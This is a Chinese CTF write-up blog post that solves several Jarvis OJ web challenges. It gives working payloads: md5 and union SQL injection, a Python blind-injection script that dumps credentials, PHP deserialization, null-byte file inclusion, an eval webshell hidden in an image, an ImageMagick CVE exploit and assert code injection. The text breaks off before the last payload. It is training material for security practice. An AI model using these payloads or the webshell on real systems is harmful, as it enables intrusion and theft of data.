<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Jarvis OJ WriteUp Web | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="序本文介绍Jarvis OJ web方向上一些题目的解答，部分题目在其它文章中已经单独给出解答，这里只给出链接。 LOCALHOST 进入链接，页面如上所示。要求本地登陆，尝试修改X-Forwarded-For字段：  得到flag LOGIN 进入发现需要密码进行登录，随意输入抓包得：  注意到响应中的Hint字段给出了sql查询的构造语句。在这里通过学习发现字符串ffifdyop的md5散列值">
<meta property="og:type" content="article">
<meta property="og:title" content="Jarvis OJ WriteUp Web">
<meta property="og:url" content="http://example.com/2019/11/06/jarvis-oj-writeup-web/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="序本文介绍Jarvis OJ web方向上一些题目的解答，部分题目在其它文章中已经单独给出解答，这里只给出链接。 LOCALHOST 进入链接，页面如上所示。要求本地登陆，尝试修改X-Forwarded-For字段：  得到flag LOGIN 进入发现需要密码进行登录，随意输入抓包得：  注意到响应中的Hint字段给出了sql查询的构造语句。在这里通过学习发现字符串ffifdyop的md5散列值">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193824.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193946-1024x500.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194226-1024x497.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194450.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195234.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195355.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200021-1024x504.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200150-1024x240.png">
<meta property="og:image" content="http://example.com/2019/11/06/jarvis-oj-writeup-web/showimg.php?img=c2hpZWxkLmpwZw==">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200916.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203618-1024x499.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203747.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203829.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203912.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203947.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204452-1024x350.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204610.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110102608.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103320-1024x466.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103500.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103651-1024x648.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104306-1024x642.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104316-1024x394.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104324-1024x376.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104333-1024x385.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002504-1024x243.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002804.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002839.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127194439-1024x543.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127195845.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/01/image-1024x373.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/01/image-1-1024x142.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/01/image-2.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/01/image-3.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-1-1024x364.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-2.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-3.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-4.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-5-1024x625.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-6-1024x313.png">
<meta property="og:image" content="http://106.54.80.67/wp-content/uploads/2020/04/image-7.png">
<meta property="article:published_time" content="2019-11-06T12:11:55.000Z">
<meta property="article:modified_time" content="2021-05-29T15:36:51.480Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193824.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-jarvis-oj-writeup-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/06/jarvis-oj-writeup-web/" class="article-date">
  <time class="dt-published" datetime="2019-11-06T12:11:55.000Z" itemprop="datePublished">2019-11-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      Jarvis OJ WriteUp Web
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>本文介绍Jarvis OJ web方向上一些题目的解答，部分题目在其它文章中已经单独给出解答，这里只给出链接。</p>
<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193824.png"></p>
<p>进入链接，页面如上所示。要求本地登陆，尝试修改X-Forwarded-For字段：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193946-1024x500.png"></p>
<p>得到flag</p>
<h2 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194226-1024x497.png"></p>
<p>进入发现需要密码进行登录，随意输入抓包得：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194450.png"></p>
<p>注意到响应中的Hint字段给出了sql查询的构造语句。在这里通过学习发现字符串ffifdyop的md5散列值中含有可进行sql注入的字符，且后端代码中使用的md5函数的第二个参数为true，即输出为原始字符串，而非参数为false时的十六进制字符串。为了验证，我们给出php代码如下：</p>
<?php
    $word1 = md5(ffifdyop,true);
    $word2 = md5(ffifdyop,false);
    echo $word1;
    echo '<br>';
    echo $word2;
?>

<p>输出为</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195234.png"></p>
<p>显然第一个输出的字符串可作为sql注入的payload，因此将pass设为该值并发送请求，得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195355.png"></p>
<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>进入链接，只有一张图片：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200021-1024x504.png"></p>
<p>只有一张图片，查看源代码：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200150-1024x240.png"></p>
<p>注意到图片的来源和img参数，显然参数值是base64加密值，解码后为shield.php。尝试使img的值为showimg.php的base64加密，发现存在源码泄露，可以得到showimg.php的代码：</p>
<?php
$f = $\_GET\['img'\];
if (!empty($f)) {
$f = base64\_decode($f);
if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE
&& stripos($f,'pctf')===FALSE) {
readfile($f);
} else {
echo "File not found!";
}
}
?>

<p>对该程序进行测试和绕过花费了许多时间，但是没有找到可行的方法。后猜测是否存在别的源码文件，发现确实存在，使用与上面相同的方法可得到index.php的代码以及shield.php的代码：</p>
<?php 
require\_once('shield.php');
$x = new Shield();
isset($\_GET\['class'\]) && $g = $\_GET\['class'\];
if (!empty($g)) {
$x = unserialize($g);
}
echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

<?php
//flag is in pctf.php
class Shield {
public $file;
function \_\_construct($filename = '') {
$this -> file = $filename;
}

function readfile() {
if (!empty($this->file) && stripos($this->file,'..')===FALSE  
&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {
return @file\_get\_contents($this->file);
}
}
}
?>

<p>到此目标已经十分明确，即通过反序列化读出pctf.php文件，故构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class&#x3D;O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200916.png"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>该题在 <a target="_blank" rel="noopener" href="http://106.54.80.67/index.php/2019/11/03/php%e4%b8%adsession%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/">http://106.54.80.67/index.php/2019/11/03/php%e4%b8%adsession%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/</a> 中已给出解答。</p>
<h2 id="ADMIN"><a href="#ADMIN" class="headerlink" title="ADMIN"></a>ADMIN</h2><p>进入页面啥也没有，抓包也一无所获：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203618-1024x499.png"></p>
<p>这时候一定要记得使用扫描器或者其它工具找找有无其它可读文件。使用扫描器得到有robots.txt</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203747.png"></p>
<p>进入该页面：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203829.png"></p>
<p>此为假flag，抓包查看：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203912.png"></p>
<p>注意到cookie中的admin字段，将其改为1：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203947.png"></p>
<p>得到flag</p>
<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204452-1024x350.png"></p>
<p>需要用本地的51端口访问，使用curl工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204610.png"></p>
<h2 id="In-a-mess"><a href="#In-a-mess" class="headerlink" title="In a mess"></a>In a mess</h2><p>进入链接：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110102608.png"></p>
<p>进入index.phps，可造成源码泄露：</p>
<?php

error\_reporting(0);
echo "<!--index.phps-->";

if(!$\_GET\['id'\])
{
header('Location: index.php?id=1');
exit();
}
$id=$\_GET\['id'\];
$a=$\_GET\['a'\];
$b=$\_GET\['b'\];
if(stripos($a,'.'))
{
echo 'Hahahahahaha';
return ;
}
$data = @file\_get\_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
require("flag.txt");
}
else
{
print "work harder!harder!harder!";
}


?>

<p>阅读源码，可知参数$a中不能出现.字符，并且需要以$a为文件名的文件内容是所给定的字符串，想到php://input伪协议。参数$b需要其与字符串”111”拼接后的内容与1114相等，却又需要第一个字符不为4，且长度大于5.注意到这里采用了eregi函数，想到eregi的NULL截断漏洞，故可构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;index.php?id&#x3D;%22%22&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%00123456789</span><br></pre></td></tr></table></figure>

<p>同时post数据：1112 is a nice lab!，即可得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103320-1024x466.png"></p>
<p>此为下一个部分的地址，进入得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103500.png"></p>
<p>观察url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5eHT2mCpcvOLf&#x2F;index.php?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>注意到id参数，尝试sql注入：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103651-1024x648.png"></p>
<p>证实猜测。现在测试过滤哪些字符，经测试，有如下关键词：</p>
<ul>
<li>  space(空格)</li>
<li>  tab</li>
<li>  /**/</li>
<li>  select</li>
<li>  union</li>
<li>  from</li>
</ul>
<p>注意到过滤词很多，但是对于后三个只是采用简单的正则替换，而对于/**/，可以采用如/*1*/的方式绕过，达到空格的效果，故注入的过程如下：</p>
<p>首先使用order by注出列数为3，然后注出数据库名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104306-1024x642.png"></p>
<p>表名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104316-1024x394.png"></p>
<p>字段名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104324-1024x376.png"></p>
<p>字段内容：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104333-1024x385.png"></p>
<p>得到flag。</p>
<h2 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002504-1024x243.png"></p>
<p>这里首先给出了一个文件下载，观察文件名猜测是mysql中的用户定义函数，观察后缀so猜测为linux下的动态链接库文件(如为windows则为.dll)。下载改名为udf.so,导入mysql的plugin文件夹，启动mysql。题目中有提示help_me函数，故执行语句：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002804.png"></p>
<p>于是继续导入getflag函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002839.png"></p>
<p>得到flag。mysql中的udf的详细资料可参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/10522972.html">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>
<h2 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h2><p>页面很简单，考察点也很明确，即sql注入：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127194439-1024x543.png"></p>
<p>经过一些测试发现在某些情况下回显为用户名错误，某些情况下回显为密码错误，即进行用户名查询时若查询成功但密码不正确返回密码错误，我们可以利用这一点判断条件是否满足，以此进行盲注。</p>
<p>经过进一步测试，发现这里过滤了空格，即将空格替换为空。使用payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;# password&#x3D;123</span><br><span class="line">username:admin&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1 password&#x3D;123</span><br></pre></td></tr></table></figure>

<p>回显均为密码错误，可猜测对用户名的查询是拼接上单引号后直接进行查询。故可编写脚本对其进行爆破。首先判断回显值的意义：</p>
<p>def check_result(r):<br>    if re.search(“用户名错误”, r.text):<br>        return “no pass”<br>    elif re.search(“密码错误”, r.text):<br>        return “pass”<br>    else:<br>        return “nothing”</p>
<p>其次，使用二分搜索的方法对字段进行爆破：</p>
<p>def burp(url, sql_query, info):<br>    is_end = False<br>    count = 1<br>    while not is_end:<br>        inf = 36<br>        sup = 127<br>        is_end = True<br>        while sup &gt; inf:<br>            i = (inf + sup) // 2<br>            data = {<br>                ‘username’: “admin’/**/and/**/ascii(substring(({}),{},1))={}#”.format(sql_query, count, i),<br>                ‘password’: “123”}<br>            result = check_result(requests.post(url, data))<br>            if result is “pass”:<br>                is_end = False<br>                break<br>            else:<br>                data[‘username’] = data[‘username’].replace(“1))=”, “1))&gt;”)<br>                result = check_result(requests.post(url, data))<br>                if result is “pass”:<br>                    inf = i + 1<br>                else:<br>                    sup = i<br>        if not is_end:<br>            count += 1<br>            info.append(chr(i))</p>
<p>最后编写爆出库名，表名，字段名，字段内容的各个查询语句：</p>
<p>def get_database(url):<br>    sql_query = “database()”<br>    database = []<br>    burp(url, sql_query, database)<br>    print(“”.join(database))</p>
<p>def get_table(url):<br>    sql_query = “select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/“ \<br>                “table_schema=database()”<br>    table_name = []<br>    burp(url, sql_query, table_name)<br>    print(“”.join(table_name))</p>
<p>def get_column(url):<br>    sql_query = “select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/“ \<br>                “table_name=’admin’”<br>    column_name = []<br>    burp(url, sql_query, column_name)<br>    print(“”.join(column_name))</p>
<p>def get_data(url):<br>    sql_query = “select/**/group_concat(id,username,password)/**/from/**/admin”<br>    data = []<br>    burp(url, sql_query, data)<br>    print(“”.join(data))</p>
<p>调用之后可得到信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># number of columns:1</span><br><span class="line"># database:injection</span><br><span class="line"># table:admin</span><br><span class="line"># column:id,username,password</span><br><span class="line"># data:1,admin,334cfb59c9d74849801d5acdcfdaadc3</span><br></pre></td></tr></table></figure>

<p>这里的密码采用md5处理后保存，查询后得到密码，登录得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127195845.png"></p>
<h2 id="Simple-gallery"><a href="#Simple-gallery" class="headerlink" title="Simple gallery"></a>Simple gallery</h2><p>进入链接，发现功能点较多，如下图，猜测主要可利用点为文件上传。</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-1024x373.png"></p>
<p>该处的url为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>观察page参数，猜测后端通过page参数读取本地文件，可能能进行本地文件包含。尝试如下url：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit.php</span><br></pre></td></tr></table></figure>

<p>回显为：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-1-1024x142.png"></p>
<p>证实这里的后端代码是通过page参数拼接后缀扩展名进行文件包含。进一步尝试发现%00截断可用，即使用payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit.php%00</span><br></pre></td></tr></table></figure>

<p>结果正确。</p>
<p>解决文件包含问题后，目标转为上传shell。尝试上传文件，发现后端对文件扩展名，MIME，文件标识字段都进行了检查。于是尝试上传图片马，编写一句话木马1.php与正常图片采用如下命令进行拼接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy pic.jpg&#x2F;b + 1.php&#x2F;a 1.jpg</span><br></pre></td></tr></table></figure>

<p>即生成图片马，上传至服务器，得到上传后的文件名。使用如下payload进行访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;uploads&#x2F;1579144207.jpg%00</span><br></pre></td></tr></table></figure>

<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-2.png"></p>
<p>发现被拦截，可能为检测到马中的关键字符。于是换用如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>生成图片马后上传后直接得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-3.png"></p>
<h2 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h2><p>站点内仅有图片上传功能</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image.png"></p>
<p>经过测试，其通过白名单检测后缀与类型，找不到绕过方法。扫描后台发现test.php，作用为phpinfo。阅读别人文章后发现，通过phpinfo可以得知该站点使用了imagick服务：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-1-1024x364.png"></p>
<p>这里可以利用CVE-2016-3714，具体内容参考<a target="_blank" rel="noopener" href="https://www.jb51.net/article/94419.htm">https://www.jb51.net/article/94419.htm</a>。这里我们利用eliftool工具写入希望执行的代码，即：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-2.png"></p>
<p>上传文件时需要将filetype参数改为show或win，原因在CVE的原理中提到过，是为了调用所需要的委托。在测试中发现，修改filetype后图片无法上传，可能为环境已经被破坏。正常在上传之后就能使用菜刀连接shell读取文件。</p>
<h2 id="Inject"><a href="#Inject" class="headerlink" title="Inject"></a>Inject</h2><p>题目提示先获取源码，尝试.git，svn等方式后发现php~课获得源码如下：</p>
<?php
require("config.php");
$table = $\_GET\['table'\]?$\_GET\['table'\]:"test";
$table = Filter($table);
mysqli\_query($mysqli,"desc \`secret\_{$table}\`") or Hacker();
$sql = "select 'flag{xxx}' from secret\_{$table}";
$ret = sql\_query($sql);
echo $ret\[0\];
?>

<p>分析代码逻辑，发现代码首先获取table参数的值，若table值不存在则设为test。其次通过过滤器。而后执行查询语句<code>decs `secret_&#123;$table&#125;` </code> ，而我们发现，如果该语句运行失败，即参数不是事实存在的库，则会触发Hacker()函数。而事实上执行注入的语句应为后面的<code>select &#39;flag&#123;xxx&#125;&#39; from secret_&#123;$table&#125;</code>,并且该查询语句有回显。对于第一条语句，其中使用了反引号，根据实验和阅读文章，得知在mysql中反引号的作用主要有两点，其一是用于包裹mysql中的关键字，使之解释为普通的字符串而非关键字，其二则可用于为库设置别名，如下所示：</p>
<p>select `select` from a # 从a表中查询select字段<br>select  bbb `aaa` from a # 从a表中查询bbb字段，并赋予bbb字段aaa别名</p>
<p>则可构造参数闭合反引号，即查询payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?&#x2F;table&#x3D;test&#96; &#96; union select database() limit 1,1</span><br><span class="line">?&#x2F;table&#x3D;test&#96; &#96; union select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1</span><br><span class="line">&#x2F;?table&#x3D;test&#96; &#96; union select column_name from information_schema.columns where table_name&#x3D;0x7365637265745F666C6167 limit 1,1</span><br></pre></td></tr></table></figure>

<p>分别得到库名，表名和字段名，注意到代码中过滤了引号，所以采用16进制输入。</p>
<h2 id="Web？"><a href="#Web？" class="headerlink" title="Web？"></a>Web？</h2><p>这题比较繁琐。进入页面，仅有一个提交密码的界面。抓包没有收获，查看源代码中引入的app.js，格式化后为20000多行的js代码。搜索返回的错误代码，发现如下函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-3.png"></p>
<p>跳转到checkpass函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-4.png"></p>
<p>再次查找_checkpass_REACT_HOT_LOADER，发现：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-5-1024x625.png"></p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-6-1024x313.png"></p>
<p>是一个求矩阵乘法的问题，使用在线网站解出即可。</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>首页中给出提示</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-7.png"></p>
<p>可能为git源码泄露，使用githack获取源码，对源码进行分析，在index.php中有对page参数的处理：</p>
<?php
if (isset($\_GET\['page'\])) {
$page = $\_GET\['page'\];
} else {
$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file\_exists('$file')") or die("That file doesn't exist!");
?>

<p>这里的考察点是断言的代码注入。执行assert函数时，若参数为字符串，则php解析引擎将字符串作为代码执行。所以对于语句<code>assert(&quot;file_exists(&#39;$file&#39;)&quot;)</code> 可将函数闭合后进行代码注入，即payload为：</p>
